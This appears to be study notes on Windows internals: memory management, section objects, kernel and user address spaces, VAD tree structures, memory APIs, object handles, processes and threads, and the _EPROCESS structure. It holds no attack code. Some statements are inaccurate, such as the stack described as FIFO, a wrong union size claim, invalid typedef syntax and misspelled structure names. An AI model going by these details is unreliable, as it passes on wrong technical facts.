<p>It is made up of many components, all kernel-mode subsystems, mostly implemented in <code>ntoskrnl.exe</code>:</p>
<ul>
<li><strong>The Object Manager</strong></li>
<li><strong>The Security Reference Monitor</strong> (SRM)</li>
<li><strong>The Process Manager</strong></li>
<li><strong>The Memory Manager</strong></li>
<li><strong>The I/O Manager</strong></li>
<li><strong>The Cache Manager</strong></li>
<li><strong>The Configuration Manager</strong></li>
<li><strong>The Plug And Play Manager</strong> (PnP)</li>
<li><strong>The Virtual Memory Manager</strong></li>
</ul>
<p>The function of these subsystems will be elaborated on as they come up.</p>
<p>User-Mode applications use the Win32 APIs to interact with the Windows Executive. This provides abstraction from hardware, enforces security and isolation, enables multitasking and stability, and makes Windows a hybrid-kernel not a microkernel since the kernel is not monolithic.</p>
<h2 id="memory-management"><a class="header" href="#memory-management">Memory Management</a></h2>
<h3 id="virtual-memory-and-paging"><a class="header" href="#virtual-memory-and-paging">Virtual Memory and Paging</a></h3>
<p><code>Virtual Memory</code> is a memory management technique used by operating systems to provide the illusion of a much larger, contiguous block of main memory than is physically available, by using a portion of the secondary storage as an extension of the physical memory. It allows programs to run, even if they are larger than the available physical memory by mapping a program's virtual addresses to physical addresses in RAM.</p>
<p>Virtual Memory offers several key benefits:</p>
<ul>
<li><code>Multitasking</code>: more apps can run than RAM alone could allow</li>
<li><code>Memory Abstraction</code>: No need for developers to worry about memory size or fragmentation</li>
<li><code>Security</code>: Prevents apps from overwriting memory space that is not their own through isolation.</li>
</ul>
<p><code>Paging</code> is the most common memory management scheme used to implement virtual memory.</p>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note"></a>
</div>
<div>
<ol>
<li><code>Fixed-size Blocks</code>: Both physical and virtual memory are divided into fixed-size blocks (pages for virtual, frames for physical).</li>
<li><code>Page Table</code>: A data structure managed by the operating system that keeps track of the mapping between a programs virtual pages and the physical frames where they are stored. Each process has its own Page Table, and each Page Table is stored in physical memory.</li>
<li><code>Page Faults</code>: Occurs when a program tries to access a virtual address that doesn't have a corresponding physical frame in RAM (because the page is currently stored on the disk)</li>
<li><code>Swapping</code>: When a page fault occurs, the operating system finds the required page in the paging file (<code>pagefile.sys</code> on Windows), loads it into an available physical frame, updates the page table, then allows the program to continue its execution. If no frames are free, an old one is paged into the paging file to make space.</li>
</ol>
</div>
</div>
<p><img src="https://hackmd.io/_uploads/rytLz9F6xg.png" alt="image" /></p>
<blockquote>
<p>Diagram of Virtual Memory and Paging</p>
</blockquote>
<h3 id="working-sets"><a class="header" href="#working-sets">Working Sets</a></h3>
<p><code>Working Set</code>: The set of pages that a process has recently referenced and currently reside in physical memory (<code>RAM</code>).</p>
<p>The working set of a process is used to determine said process's active use of physical memory and which pages have not been accessed in a while. Such pages can then be paged out to disk (<code>pagefile.sys</code>) and removed from the process's working set.</p>
<h3 id="section-objects"><a class="header" href="#section-objects">Section Objects</a></h3>
<p>A <code>Section Object</code> is a kernel object, which represents a region of memory that can be shared between multiple processes. They can be mapped to multiple places, making them a convenient tool for applications to share memory between them. In fact, the system uses section objects to share memory between the kernel and user-mode processes. A section is mapped into both the kernel address space and one or more user-mode address spaces.</p>
<p>There are two basic types of section object:</p>
<ul>
<li><code>Pagefile-Backed</code>: An empty section of virtual memory that can be used for temporary storage of information and is usually created to share data between two processes or between applications and the kernel.</li>
<li><code>File-Backed</code>: A region of virtual memory directly associated with a specific file on disk ,used as a convenient way of accessing a file using a pointer, rather that APIs, such as <code>ReadFile</code> and <code>WriteFile</code>.
<ul>
<li>Systems use file-backed section objects for a variety of purposes, including the loading of executable images.</li>
</ul>
</li>
</ul>
<p>Sometimes, a <code>Section Object</code> is referred to as a <strong>File Mapping Object</strong>. They are created for a number of reasons, including:</p>
<ul>
<li><code>Image Loading</code>: When a new process is created, it must allocate space within virtual memory for the contents of the main executable file (<code>.exe</code>) and any shared libraries it uses (<code>.dll</code>). A section object is created for each of these files, so that the actual <code>.exe</code> or <code>.dll</code> does not have to be accessed directly, using the <code>ReadFile</code> and <code>WriteFile</code> Win32 API functions.</li>
<li><code>Inter-Process Communication</code>(IPC): Pagefile-backed section objects provide an inexpensive way for processes to share information with one another, without frequently transitioning to kernel-mode.</li>
<li><code>Anonymous Memory Allocation</code>: When a process uses a function, like <code>VirtualAlloc</code> for anonymous memory, Windows typically backs it with an unnamed, pagefile-backed section object.</li>
</ul>
<h3 id="kernel-memory-and-user-memory"><a class="header" href="#kernel-memory-and-user-memory">Kernel Memory and User Memory</a></h3>
<p>The principle of separating <code>kernel memory</code> and <code>user memory</code> is a cornerstone of modern operating systems. This distinction ensures stability, security, and integrity for the system. By preventing user-mode applications from directly accessing the core data structures of the OS, we protect the system from bugs and malicious software that could otherwise cause crashes or grant unauthorized control of the system.</p>
<p>Modern, 64-bit Windows systems have a vastly different memory architecture than their predecessors, as their 64-bit system offers a theoretical address space of 2⁶⁴ bytes. The total virtual address space is logically divided into two distinct regions:</p>
<ul>
<li><code>User-Mode Memory</code>: The memory space allocated for each individual process.
<ul>
<li>Every process has its own isolated, private user-mode address space, making it so that a bug in one app's memory will not affect other apps, or the operating system itself.</li>
</ul>
</li>
<li><code>Kernel-Mode Memory</code>: Memory space reserved for the operating system, kernel, device drivers, and other system-level components.</li>
</ul>
<p>Modern processors and operating systems support a very large virtual address space, typically up to 128 TB for user-mode applications and 128 TB for kernel-mode components.</p>
<p>The separation of these two regions ensures that the kernels critical functions and data structures are always secure and available. The kernel code and data are always mapped into the support portion of every process's address space. This allows the OS to handle system calls and interrupts efficiently, without having to switch memory contexts.</p>
<h4 id="the-kernel-memory-space"><a class="header" href="#the-kernel-memory-space">The Kernel Memory Space</a></h4>
<p>The 128 TB allocated for kernel mode components is not statically allocated, as most components have a dynamic size that can be determined in runtime based on the physical memory available and the many user-configurable registry keys that are needed. Some of these components include:</p>
<ul>
<li><code>Paged Pool</code>: Kernel memory pool used to store data structures which can be paged out if the system is under memory pressure, including:
<ul>
<li>Object Handles</li>
<li>Registry Hives</li>
<li>System Driver Data</li>
</ul>
</li>
<li><code>Nonpaged Pool</code>: Kernel memory pool used to store data structures which must remain in physical RAM for as long as they are allocated.
<ul>
<li>This section is used for data, which must be accessible at all times, including:
<ul>
<li>Interrupt Service Routines (<code>ISRs</code>) and Deferred Procedure Calls (<code>DPCs</code>)
<ul>
<li>These structures cannot handle page faults</li>
</ul>
</li>
<li>Thread and Process Objects</li>
<li>I/O Request Packets (<code>IRPs</code>)</li>
<li>Synchronization Objects (<code>events</code>, <code>mutexes</code>, <code>semaphores</code>, etc.)</li>
</ul>
</li>
</ul>
</li>
<li><code>System Cache</code>: The section of kernel-memory used to cache file data from the disk. When an application reads from a file, the memory manager may copy the file data into the system cache to speed up subsequent reads by the same or other applications.</li>
<li><code>Terminal Services Session Space</code>: In a multi-user environment (like Remote Desktop Services), each user session has its own isolated session space in kernel memory. This space contains session-specific data ns for components which require isolation between user actions, such as <code>win32k.sys</code>, which manages the graphical user interface.</li>
<li><code>Page Tables</code>: A mapping to kernel-managed data structures stored in physical memory that describe how each process’s virtual addresses are translated into physical memory addresses. On modern 64-bit architectures, these tables are organized hierarchically (e.g., multi-level page tables) to efficiently represent large address spaces while conserving memory.</li>
<li><code>Hyper Space</code>: A small reserved, process-private region of the kernel's address space used to map pages on a temporary basis. For example, during page fault handling, this space is used to move data between the paging file and physical memory.</li>
<li><code>System Working Set</code>: The pages of the kernel and its components that are in RAM.</li>
<li><code>System Page-Table Entries (PTEs)</code>: Entries within page tables that contain the mapping from a virtual page to a physical frame.</li>
</ul>
<h5 id="vads-and-vad-trees"><a class="header" href="#vads-and-vad-trees">VADs and VAD Trees</a></h5>
<p>A <code>Virtual Address Descriptor</code> is a kernel data structure that describes a contiguous region of memory within a process's virtual address space. Each one is represented by a <code>_MMVAD</code> structure, which is used by the Windows Memory Manager to keep track of every reserved or committed range of virtual memory within a process's address space.</p>
<p>A <code>VAD Tree</code> describes the collection of all <code>_MMVAD</code> structures within a process, organized into a self-balancing binary search tree. It makes it possible to quickly identify a specific virtual memory address within a process's virtual memory space.</p>
<p>The <code>_MMVAD</code> structure is not officially documented, but it has been reverse engineered, with a set of particularly useful versions being published through the Vergilius Project. The <code>Vergilius Project</code> provides information about kernel structures, unions, and enumerations from publicly available Program Database (<code>.pdb</code>) files, most of which are not officially documented and cannot be found in the Windows Driver Kit (<code>WDK</code>) headers.</p>
<p>Here is the <code>Windows 11 23H2 (Nickel R2)</code> version of the <code>_MMVAD</code> structure's signature:</p>
<pre><code class="language-C">typedef struct _MMVAD
{
    struct _MMVAD_SHORT Core;
    struct _MMVAD_FLAGS2 VadFlags2;
    struct _SUBSECTION* Subsection;
    struct _MMPTE* FirstPrototypePte;
    struct _MMPTE* LastContiguousPte;
    struct _LIST_ENTRY ViewLinks;
    struct _EPROCESS* VadsProcess;
    union
    {
        struct _MI_VAD_SEQUENTIAL_INFO SequentialVa;
        struct _MMEXTEND_INFO* ExtendedInfo;
    } u4;
    struct _FILE_OBJECT* FileObject;
};
</code></pre>
<p>Every part of the <code>_MMVAD</code> structure is not relevant to our discussion here, but some parts of interest include:</p>
<ul>
<li><code>typedef struct</code>: a combination of <code>C</code> keywords, which define an alias for an existing type, then join a set of variables under that new name.</li>
</ul>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-1"></a>
</div>
<div>
<p><strong>Using <code>typedef struct</code></strong>
In <code>C</code>, a <code>struct</code> lets you group different variables under one name, like so:</p>
<pre><code class="language-C">struct Point {
    int x;
    int y;
};
</code></pre>
<p>You can then create instances of the structure, <code>Point</code>, as follows:</p>
<pre><code class="language-C">struct Point p1;
p1.x = 1;
p1.y = 2;
</code></pre>
<p>By including <code>typedef</code>, you can create new instances by simply providing the structure's alias, like so:</p>
<pre><code class="language-C">typedef struct Point {...};
Point p2;
p2.x = 1;
p2.y = 2;
</code></pre>
</div>
</div>
<ul>
<li><code>_MMVAD_SHORT</code>: A critical, embedded structure which contains the essential components of the VAD. More on this later.</li>
<li><code>_MMVAD_FLAGS2</code>: A 32-bit set of field flags used to control and track the VAD's state.</li>
<li><code>_SUBSECTION</code>: A pointer to the Subsection structure, which describes how the memory region is backed by a Section Object and, ultimately, a file on disk.
<ul>
<li>If this pointer is NULL, the memory is typically backed by the page file.</li>
</ul>
</li>
<li><code>_MMPTE</code>: (Memory Manager Page Table Entry) A Windows kernel structure that represents a single page table entry (PTE) used by the Memory Manager (MM) to describe if or how a virtual page is mapped to physical memory.
<ul>
<li><code>FirstPrototypePte</code> and <code>LastContiguousPte</code> contain pointers which define the start and end of the <code>Prototype Page Table Entries</code> list. This list tells the Memory Manager where to find the content for every page within the VADs <code>Virtual Page Number</code> (<strong>VPN</strong>) range.</li>
</ul>
</li>
<li><code>union {...} u4;</code>: A C language construct, which declares an anonymous union type, then defines a variable or field named u4 of that type.
<ul>
<li><code>VadsProcess</code> is the <code>_EPROCESS</code> kernel object that the VAD belongs to.</li>
</ul>
</li>
</ul>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-2"></a>
</div>
<div>
<p>A <code>union {...} name;</code> is a special data structure, which allows a developer to store different data types within the same memory location. This means that the <code>union</code> construct is only as large as its largest member.</p>
<p>For example:</p>
<pre><code class="language-C">union {
    int IntegerValue;
    float FloatValue;
    char Bytes[10];
} age;
</code></pre>
<p>Creates an anonymous union construct, which can be either an <code>Integer</code>, a <code>Float</code>, or a <code>Character String</code> (up to 4-bytes). This construct is then assigned to a variable, <code>age</code></p>
<p>You can set the value of a union construct like so:</p>
<pre><code class="language-C">...
age.IntegerValue = 20;
age.FloatValue = 20.0;
strcpy(age.Bytes, "twenty");
</code></pre>
<p>But, <strong>only one member should be set and read at a time</strong>. Reading a different member than the one that was last written will read the memory space of the <code>union</code> construct as the data type of the member you attempted to read:</p>
<pre><code class="language-C">...
printf("The value of union is %i", age.IntegerValue);
// This will output "1852143476", since it is equivalent to "twen" in decimal
</code></pre>
<p>You can also create named unions and use <code>typedef</code> to streamline their creation:</p>
<pre><code class="language-C">union Age{
    unsigned int IntegerValue;
    float FloatValue;
    char Bytes[10];
};

union Age a;
a.IntegerValue = 20;

typedef union Year{
    UINT IntegerValue;
    ULONG LongValue;
    char Bytes[30];
}

Year y;
strcpy(y.Bytes, "two-thousand twenty-five");
</code></pre>
</div>
</div>
<ul>
<li><code>_EPROCESS*</code>: a pointer to a Windows kernel structure, which represents a process.</li>
<li><code>_FILE_OBJECT*</code>: a pointer to a Windows kernel object that represents an open file or device.
<ul>
<li><code>FileObject</code> is a pointer to the kernel object that represents the file on disk representing that particular VAD. <code>NULL</code> if the VAD is private (pagefile-backed or physical memory only).</li>
</ul>
</li>
</ul>
<p>The core components of <code>_MMVAD</code> are housed in it's <code>Core</code> attribute, which is a <code>_MMVAD_SHORT</code> type structure. <code>_MMVAD_SHORT</code> is essential for maintaining the VAD Tree and describing the memory regions basic properties.</p>
<p>Here is the <code>Windows 11 23H2 (Nickel R2)</code> version of the <code>_MMVAD_SHORT</code> structure's signature:</p>
<pre><code class="language-C">typedef struct _MMVAD_SHORT
{
    union
    {
        struct
        {
            struct _MMVAD_SHORT* NextVad;
            VOID* ExtraCreateInfo;
        };
        struct _RTL_BALANCED_NODE VadNode;
    };
    ULONG StartingVpn;
    ULONG EndingVpn;
    UCHAR StartingVpnHigh;
    UCHAR EndingVpnHigh;
    UCHAR CommitChargeHigh;
    UCHAR SpareNT64VadUChar;
    volatile LONG ReferenceCount;
    struct _EX_PUSH_LOCK PushLock;
    union
    {
        ULONG LongFlags;
        struct _MMVAD_FLAGS VadFlags;
        struct _MM_PRIVATE_VAD_FLAGS PrivateVadFlags;
        struct _MM_GRAPHICS_VAD_FLAGS GraphicsVadFlags;
        struct _MM_SHARED_VAD_FLAGS SharedVadFlags;
        volatile ULONG VolatileVadLong;
    } u;
    ULONG CommitCharge;
    union
    {
        struct _MI_VAD_EVENT_BLOCK* EventList;
    } u5;
};
</code></pre>
<p>Every part of the <code>_MMVAD_SHORT</code> structure is not relevant to our discussion here, but some parts of interest include:</p>
<ul>
<li>
<p><code>VOID*</code>: A void pointer to memory address for some data with no defined data type. * <code>ExtraCreateInfo</code> is used to temporarily store metadata about the VAD while it is being created.</p>
<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
<div class="admonition-title">
<div id="admonition-note-3-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-3"></a>
</div>
<div>
<p><code>_MMVAD_SHORT.NextVad</code> and <code>_MMVAD_SHORT.CreateExtraInfo</code> are typically <strong>used when a batch of related VADs need to be created, split, or merged all at once</strong>. Instead of manipulating the VAD tree directly, <strong>it is easier to link the VADs in question together in a simple, temporary linked list</strong>.</p>
</div>
</div>
</li>
<li>
<p><code>_RTL_BALANCED_NODE</code>: A Windows Kernel Data Structure that represents a node in a balanced binary tree. More on this later.</p>
</li>
<li>
<p><code>ULONG</code>: Initializes an unsigned long integer value. A <code>typedef</code> alias for the standard C <code>unsigned long int</code> data type.</p>
<ul>
<li><code>StartingVpn</code> contains the first <strong>Virtual Page Number</strong> (<code>VPN</code>) in the memory region described by the VAD.</li>
<li><code>EndingVpn</code> contains the last <code>VPN</code> in that region.</li>
<li><code>CommitCharge</code> represents the number of <strong>committed</strong> pages within the address space described by the VAD.</li>
</ul>
</li>
<li>
<p><code>UCHAR</code>: Initializes an unsigned character value. A <code>typedef</code> alias for the standard C <code>unsigned char</code> data type. An <code>unsigned char</code> allows you to deal with the raw bytes of the memory region, avoiding negative values (i.e., <code>0xFF</code> should be <code>255</code>, not <code>-1</code>).</p>
<ul>
<li><code>StartingVpnHigh</code> contains the upper bits of <code>StartingVpn</code> for 64-bit addresses.</li>
<li><code>EndingVpnHigh</code> contains the upper bits of <code>EndingVpn</code> for 64-bit addresses</li>
<li><code>CommitChargeHigh</code> contains the upper bits of the <code>CommitCharge</code> value to form a 64-bit Commit Charge value.</li>
<li><code>SpareNT64VadUChar</code> contains a single byte, reserved for future use.</li>
</ul>
</li>
<li>
<p><code>volatile</code>: A type qualifier that notifies the compiler that the defined memory region may be accessed at any time outside of the program's control and access to it should not be optimized.</p>
</li>
</ul>
<p><code>_MMVAD</code> represents a single node in a VAD Tree and <code>_MMVAD_SHORE</code> initializes the core components of that node, but <code>_RTL_BALANCED_NODE</code> is responsible for adding the VAD Tree node in the correct place and maintaining the balance of the tree.</p>
<p>Here is the <code>Windows 11 24H2 (Germanium)</code> version of the structure:</p>
<pre><code class="language-C">struct _RTL_BALANCED_NODE
{
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];                             //0x0
        struct
        {
            struct _RTL_BALANCED_NODE* Left;                                //0x0
            struct _RTL_BALANCED_NODE* Right;                               //0x8
        };
    };
    union
    {
        struct
        {
            UCHAR Red:1;                                                    //0x10
            UCHAR Balance:2;                                                //0x10
        };
        ULONGLONG ParentValue;                                              //0x10
    };
};
</code></pre>
<p>Each process, <code>EPROCESS</code> contains a pointer to the root of it's VAD Tree object. Using <code>Runtime Library</code>(<strong>RTL</strong>), tree helper functions (i.e., <code>RtlInitializeGenericTable()</code>, <code>RtlRbInsertNodeEx()</code>, and <code>RtlIsRoot()</code>), the kernel is able to navigate, manipulate, and delete the VAD Tree.</p>
<h4 id="user-mode-vs-kernel-mode-memory-space"><a class="header" href="#user-mode-vs-kernel-mode-memory-space">User-Mode vs. Kernel Mode Memory Space</a></h4>
<ul>
<li><code>User-Mode Memory Space</code>:
_ <code>Location</code>: The user-mode memory occupies the lower half of the virtual address space. This is typically from <code>0x00000000'00000000</code> to <code>0x00007fff'ffffffff</code> on a 64-bit system.
_ <code>Isolation</code>: Each process has its own unique, private user-mode address space. The memory manager uses page tables to map the virtual addresses of a process to physical frames in RAM. * <code>Protection</code>: The Memory Management Unit (MMU) is configured to prevent a user-mode process from accessing any address in the kernel-mode region.</li>
</ul>
<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
<div class="admonition-title">
<div id="admonition-note-4-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-4"></a>
</div>
<div>
<p>The <strong>Memory Management Unit</strong> (MMU) is the hardware subsystem of the CPU responsible for:</p>
<ul>
<li>Translating virtual addresses into physical addresses</li>
<li>Enforcing memory protection and access rights</li>
<li>Managing caching and paging mechanisms used by the operating system.</li>
</ul>
<p>All under the supervision of the Windows kernel’s Memory Manager component.</p>
</div>
</div>
<ul>
<li><code>Kernel-Mode Memory Space</code>:
<ul>
<li><code>Location</code>: The kernel-mode memory space occupies the upper half of the virtual address space. This typically extends from <code>0xFFFF8000'00000000</code> to <code>0xFFFFFFFF'FFFFFFFF</code>.</li>
<li><code>Shared</code>: Kernel-mode virtual address space is shared by all processes. No matter which user-mode process is currently running, the kernel's code, data, and device drivers are always mapped into it's virtual address space at the same logical location.</li>
<li><code>Protected</code>: Even though this address space is shared, it is not accessible to user-mode code. The CPU's ring-based protection model ensures that only code running in kernel mode (<code>ring 0</code>) can access these addresses. User-mode code (<code>ring 3</code>) is explicitly denied access.</li>
</ul>
</li>
</ul>
<p>Every process has a set of page tables that map its virtual address space to physical memory. Importantly, these page tables are stored in kernel-mode memory. While the user-mode entries in these page tables are unique, the kernel-mode addresses are the same for all processes. When a new process is created, its page tables are initialized with a copy of the kernel's page table entries, ensuring the kernel is always mapped.</p>
<p>Current x64 CPUs only implement a subset of the total 64-bits for virtual memory addresses (typically 48 or 57 bits). For a 48-bit implementation, the user-mode addresses are canonical addresses where the 47th bit is 0, so all bits from 48-63 are also 0. Kernel-mode addresses are canonical addresses where the 47th bit is 1, so all bits from 48 to 63 are also 1.</p>
<p>The space between user-mode and kernel-mode memory regions is a non-canonical address space. This space is intentionally left empty and any attempt to access it triggers an exception, typically resulting in process termination.</p>
<h4 id="the-user-memory-space"><a class="header" href="#the-user-memory-space">The User Memory Space</a></h4>
<p>Every application is different, but they are basically using memory in the following forms:</p>
<ul>
<li><code>Private Allocations</code>: Occur when an application requests a memory block using the <code>VirtualAlloc</code> Win32 API. Allocates whole pages and nothing smaller.</li>
<li><code>Heap Allocations</code>: Allocated using a runtime library function such as <code>malloc</code> or by calling a system heap API such as <code>HeapAlloc</code>. Allocates multiple, variable-sized blocks as required for ad-hoc memory needs.
<ul>
<li>An application may implement its own heaps by directly allocating private blocks using <code>VirtualAlloc</code>.</li>
</ul>
</li>
<li><code>Stack Allocations</code>: FIFO memory allocations. Generally contains function parameters, the return address, the base stack address (for previous stack frames), and local variables.
<ul>
<li>Automatically allocated by the system for every thread while it's being created.</li>
</ul>
</li>
<li><code>Executables</code>: The mapped executable's location in memory.</li>
<li><code>Mapped Views</code>(<strong>Sections</strong>): Section Objects
<ul>
<li>Used to share memory between two or more programs.</li>
</ul>
</li>
</ul>
<h2 id="memory-management-apis"><a class="header" href="#memory-management-apis">Memory Management APIs</a></h2>
<p>The Windows Virtual Memory Manager is accessible to application programs using a set of <strong>Win32 APIs</strong> that can directly allocate and free memory blocks in user-mode address space.</p>
<p>Some of the most used <code>Win32</code> low-level memory management APIs are:</p>
<ul>
<li><code>VirtualAlloc</code>/<code>VirtualAllocEx</code>: Used to allocate private memory blocks within a process's user-mode address space.
<ul>
<li>The size of the allocation must be a multiple of the system's page size (typically <code>4KB</code> or larger).</li>
<li>Can be used to either reserve a range of virtual addresses or to commit that range to physical storage.</li>
<li>The <code>Ex</code> variant allows a privileged process to operate on the address space of another process.</li>
</ul>
</li>
<li><code>VirtualProtect</code>/<code>VirtualProtectEx</code>: Sets a memory region's protection attributes (<code>RWX</code>). Modern processes support a <code>No-Execute</code>(<code>NX</code>) bit, which the OS uses to prevent the execution of code from the <code>.data</code> section.
<ul>
<li>The <code>Ex</code> variant allows a process to modify the permissions of another process's memory space.</li>
</ul>
</li>
<li><strong>Cross-Process Memory Access</strong>: Windows provides a set of APIs for privileged processes to read or write to the address space of another process.
<ul>
<li><code>ReadProcessMemory</code></li>
<li><code>WriteProcessMemory</code></li>
</ul>
</li>
<li><strong>Section Object APIs</strong>:
<ul>
<li><code>CreateFileMapping</code>: Creates a section object, which can be pagefile or file backed for shared memory.</li>
<li><code>MapViewOfFile/MapViewOfFileEx</code>: Allows you to take a section object and map it into the address space the calling process.</li>
<li><code>UnmapViewOfFile</code>: Unmaps a previously mapped view, freeing up the virtual address range.</li>
</ul>
</li>
</ul>
<h2 id="object-handle"><a class="header" href="#object-handle">Object Handle</a></h2>
<p>The <code>Object Manager</code> is a windows kernel component responsible for creating, managing, naming, referencing, and deleting all kernel objects (such as sections, file and device objects, synchronization objects, processes and threads) in a centralized location. An <code>Object Handle</code> is a process specific identifier used by user-mode applications to reference objects.</p>
<p>When an application requests a new object (i.e., creating a new thread) the Object Manager returns a <strong>handle</strong>, which is an index into the process's private <strong>handle table</strong>. Each entry in the handle table contains a pointer to the actual underlying kernel object and an associated access mask, which defines the operations the process is able to perform on the object with that specific handle (<strong>RWX</strong>).</p>
<p>Objects themselves are data structures store in the non-paged pool of kernel memory. Every kernel object has:</p>
<ul>
<li>a standardized header that contains basic properties, including:
_ the reference count
_ the handle count
<blockquote>
<p>An object is only deleted when its reference count and handle count both drop to zero.</p>
</blockquote>
</li>
</ul>
<p>Kernel programs can directly access kernel objects using pointers, but user-mode applications must always use handles.</p>
<p><img src="https://hackmd.io/_uploads/Hyf81xXRgx.png" alt="image" /></p>
<blockquote>
<p>Diagram of <code>Process Handle Table</code> and <code>Object Manager Objects</code></p>
</blockquote>
<h2 id="named-objects"><a class="header" href="#named-objects">Named Objects</a></h2>
<p>Some kernel objects can be named, providing a way to uniquely identify them across a system. For instance, when creating a mutex object, an app can assign it a name, If another app attempts to create a mutex with the same name, the kernel will locate the existing object instead of creating a new one, ensuring both processes are referencing the same object.</p>
<p>Named Objects are arranged in virtual memory as hierarchical directories, but the Win32 API restricts user-mode applications' access to these directories.</p>
<p>Some of the most interesting directories are:</p>
<ul>
<li>
<p><code>\BaseNameObjects</code>: Where all conventional Win32 named objects, such as mutexes, are stored. When applications need to synchronize their actions or share data, they create or open named objects in this directory.</p>
</li>
<li>
<p><code>\Devices</code>: A logical representation of all active system devices, whether they are physical (like a hard drive) or logical (like a network card or a console session)</p>
</li>
<li>
<p><code>Global</code> (prev.<code>Global??</code>): The symbolic link directory. Critical for how user-mode applications access devices and other named objects. The symbolic link serves as a high-level, human readable alias for a kernel object's real name.</p>
<div id="admonition-note-5" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-5-title">
<div class="admonition-title">
<div id="admonition-note-5-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-5"></a>
</div>
<div>
<p><strong>For Example</strong>:
When an application tries to access <code>C:</code>, the Windows subsystem (i.e., <code>NTDLL</code>) resolved this symbolic link to its target in the <code>\Device</code> directory (i.e., the hard drive).</p>
</div>
</div>
</li>
</ul>
<p>Some kernel objects, (like threads) are unnamed and can only be identified by their handles or kernel object pointers.</p>
<h2 id="processes-and-threads"><a class="header" href="#processes-and-threads">Processes and Threads</a></h2>
<p>A <strong>Process</strong> is many things, but predominantly it is an isolated memory address space that can be used for running a program. These address spaces are created for each program in order to make sure they run in their own address space. In order to run a program, a process must have at least one thread.</p>
<p>A process also represents a running application, and is a protected, isolated container. It is given its own isolated virtual address space that is mapped to a specific executable image. Essentially, it is a resource container, owning resources such as handles, files, synchronization objects, and thread. It does nothing, it is simply a container.</p>
<p>A <strong>Thread</strong> is a primitive execution unit. It is a data structure that has a<code>context</code> data structure, which tells the system the state of the processor when the thread last ran, combined with one or two memory blocks that are used for stack space. The physical processor switches between multiple virtual processes, and always starts execution from the threads current context information using the threads stack.</p>
<p>The thread does work within a process and therefore a process needs at least one, but can have multiple. All threads within a single process share a virtual address space, but each thread has its own <code>CONTEXT</code>, including its own stack and CPU registers.</p>
<p><strong>Context Switching</strong> is the mechanism by which the Windows Scheduler interrupts a running thread and saves its state so that another thread can run. This happens very rapidly to create the illusion of concurrency/parallelism.</p>
<p>The following steps are performed:</p>
<ol>
<li><strong>Save the State</strong>: The CPU's registers, the stack, and the instruction pointer of the running process are saved within the Threa's <code>CONTEXT</code> block.</li>
<li><strong>Restore the State</strong>: The saved state of another thread, which the scheduler has chosen to run next, is loaded into the CPU's registers.</li>
<li><strong>Resume Execution</strong>: The new thread begins execution at the saved instruction pointer (where it left off previously).</li>
</ol>
<p>Context switching happens frequently and sometimes a thread will relinquish control voluntarily. For instance, when a program calls the <code>GetMessage</code> Win32 API, <code>GetMessage</code> will access a message queue and extract the next event to determine if the user has generated any new input events. If there aren't any new events, <code>GetMessage</code> enters a waiting state and doesn't return until a new input event comes in. When <code>GetMessage</code> enters a waiting state, the CPU will switch context.</p>
<p>Context switching also happens by default due to preemptive scheduling. Threads are given a limited amount of time to execute before they are interrupted. Every thread is assigned a <strong>quantum</strong>, which is the maximum amount of time a thread is allowed to run continuously. A low-level hardware timer is used to monitor how long the thread has been running. Once the quantum has expired, the thread is temporarily interrupted to allow other threads to execute. If no other threads need to execute, the interrupted thread immediately resumes execution.</p>
<h3 id="a-low-level-look-at-process-objects"><a class="header" href="#a-low-level-look-at-process-objects">A Low-Level Look at Process Objects</a></h3>
<p>A developer can reference a process by its name, its PID or its handle. Ultimately, the handle is translated by the owning process's Process Handle Table into a pointer value for the referenced process's kernel object. This object, known as an <code>_EPROCESS</code> object, takes on the following form:</p>
<pre><code class="language-C">typedef struct _EPROCESS {
    struct _KPROCESS Pcb;
    struct _EX_PUSH_LOCK ProcessLock;
    VOID* UniqueProcessId;
    struct _LIST_ENTRY ActiveProcessLinks;
    union _LARGE_INTEGER CreateTime;
    struct _LIST_ENTRY SessionProcessLinks;
    struct _PEB* Peb;
    struct _HANDLE_TABLE* ObjectTable;
    struct _FILE_OBJECT* ImageFilePointer;
    VOID* DebugPort;
    UCHAR ImageFileName[15];
    struct _LIST_ENTRY ThreadListHead;
    volatile ULONG ActiveThreads;
    union _LARGE_INTEGER ReadOperationCount;
    union _LARGE_INTEGER WriteOperationCount;
    union _LARGE_INTEGER OtherOperationCount;
    struct _RTL_AVL_TREE VadRoot;
    struct _PS_PROTECTION Protection;
    union _PROCESS_EXECUTION Execution;
} EPROCESS, *PEPROCESS;
</code></pre>
<blockquote>
<p>This is a truncated version of the object. Full object details can be found here: <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_EPROCESS">Vergilus Project: _EPROCESS Object Windows 11 25H2</a></p>
</blockquote>
<p>Here is a breakdown of what's happening:</p>
<ul>
<li><code>_KPROCESS Pcb</code>: The Kernel Process Block, which is responsible for the scheduler related portion of the process. It gives the Windows Dispatcher the information it needs to know which threads can run and under what conditions. This includes:
<ul>
<li>CPU‑affinity mask (which cores the process may run on)</li>
<li>Quantum (time‑slice) value for the process’s threads</li>
<li>Links that place the process’s threads on the per‑CPU ready queues</li>
</ul>
</li>
<li><code>_EX_PUSH_LOCK ProcessLock</code>: A synchronization object used to manage access to the <code>_EPROCESS</code> object.</li>
<li><code>VOID* UniqueProcessId</code>: The <strong>PID</strong> value</li>
<li><code>_LIST_ENTRY ActiveProcessLinks</code>: Links the current process into the system wide <strong>process-list</strong>, which keeps track of all live (non-terminated) processes in a doubly-linked list.</li>
